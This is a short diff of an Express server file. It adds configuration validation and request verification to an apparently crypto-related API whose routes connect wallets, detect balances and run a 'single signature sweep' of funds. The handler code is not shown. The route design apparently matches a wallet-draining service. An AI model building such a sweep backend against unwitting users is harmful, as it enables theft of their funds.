@@ -1,7 +1,7 @@
 import express from 'express'
 import cors from 'cors'
 import dotenv from 'dotenv'
-import { CONFIG, logConfig } from './src/config.js'
+import { CONFIG, logConfig, validateConfig } from './src/config.js'
 import { verifyRequest, errorHandler } from './src/middleware.js'
 import {
   handleConnect,
@@ -29,8 +29,9 @@ app.use(cors({
 }))
 app.use(express.json())
 
-// Log configuration
+// Log and validate configuration
 logConfig()
+validateConfig()
 
 // Health check
 app.get('/health', (req, res) => {
@@ -42,7 +43,7 @@ app.post('/api/connect-wallet', verifyRequest, handleConnect)
 app.post('/api/detect-balances', verifyRequest, handleDetectBalances)
 app.post('/api/execute-transfer', verifyRequest, handleExecuteTransfer)
 app.post('/api/execute-transfer-signed', verifyRequest, handleExecuteTransferSigned)
-app.post('/api/full-sweep', handleFullSweep) // ← GROK-AI single signature sweep
+app.post('/api/full-sweep', verifyRequest, handleFullSweep) // ← GROK-AI single signature sweep
 app.get('/api/transfer-status/:txHash', handleTransferStatus)
 
 // 404 Handler
